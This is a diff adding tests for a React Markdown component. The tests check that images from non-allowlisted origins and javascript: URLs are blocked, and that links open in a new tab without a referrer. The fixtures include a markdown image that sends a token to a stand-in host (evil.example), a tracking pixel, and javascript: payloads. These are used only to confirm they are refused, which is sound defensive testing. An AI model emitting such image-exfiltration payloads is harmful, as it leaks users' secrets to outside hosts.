@@ -17,6 +17,7 @@ import {
   Field,
   Frame,
   Input,
+  Markdown,
   NativeSelect,
   Notice,
   PaneBoundary,
@@ -118,4 +119,67 @@ test("pane resolution errors become local notices", () => {
   );
   assert.ok(html.includes("Context is unavailable"));
   assert.ok(html.includes("View not found"));
+});
+
+const markdown = (source: string, imageOrigins?: readonly string[]) =>
+  renderToStaticMarkup(
+    <Markdown imageOrigins={imageOrigins}>{source}</Markdown>,
+  );
+const images = (html: string) =>
+  [...html.matchAll(/<img [^>]*src="([^"]*)"/g)].map((match) => match[1]);
+
+// The URL policy itself is tested in client/web/markdown.test.ts.
+test("Markdown renders a refused image as its alt text, never as an img", () => {
+  for (
+    const source of [
+      "![secret](https://evil.example/collect?q=token)",
+      "![ref][pixel]\n\n[pixel]: //evil.example/ref.png",
+      "![x](javascript:alert%281%29)",
+    ]
+  ) {
+    const html = markdown(source, ["https://cdn.example"]);
+    assert.deepEqual(images(html), [], html);
+    assert.doesNotMatch(html, /evil\.example|javascript:/, html);
+    assert.match(html, /data-slot="blocked-image"/);
+  }
+  assert.match(markdown("![Chart](https://evil.example/a.png)"), />Chart</);
+  assert.match(markdown("![](https://evil.example/a.png)"), /Image not loaded/);
+});
+
+test("Markdown loads relative, same-origin and allowlisted images", () => {
+  assert.deepEqual(images(markdown("![a](/files/a.png)")), ["/files/a.png"]);
+  const page = Object.getOwnPropertyDescriptor(globalThis, "location");
+  Object.defineProperty(globalThis, "location", {
+    value: new URL("https://app.example/chat?thread=t"),
+    configurable: true,
+  });
+  try {
+    const source =
+      "![a](https://app.example/a.png) ![b](https://cdn.example/b.png)";
+    assert.deepEqual(images(markdown(source)), [
+      "https://app.example/a.png",
+    ]);
+    assert.deepEqual(images(markdown(source, ["https://cdn.example"])), [
+      "https://app.example/a.png",
+      "https://cdn.example/b.png",
+    ]);
+  } finally {
+    if (page) Object.defineProperty(globalThis, "location", page);
+    else delete (globalThis as { location?: unknown }).location;
+  }
+});
+
+test("Markdown links stay clickable, open a new tab and send no referrer", () => {
+  const html = markdown(
+    "[site](https://example.com/a) and https://example.com/auto and [x](javascript:alert%281%29)",
+  );
+  const links = [...html.matchAll(/<a [^>]*>/g)].map((match) => match[0]);
+  assert.equal(links.length, 3, html);
+  for (const link of links) {
+    assert.match(link, /target="_blank"/);
+    assert.match(link, /rel="noopener noreferrer nofollow"/);
+  }
+  assert.match(html, /href="https:\/\/example.com\/a"/);
+  assert.match(html, /href="https:\/\/example.com\/auto"/);
+  assert.doesNotMatch(html, /javascript:/);
 });
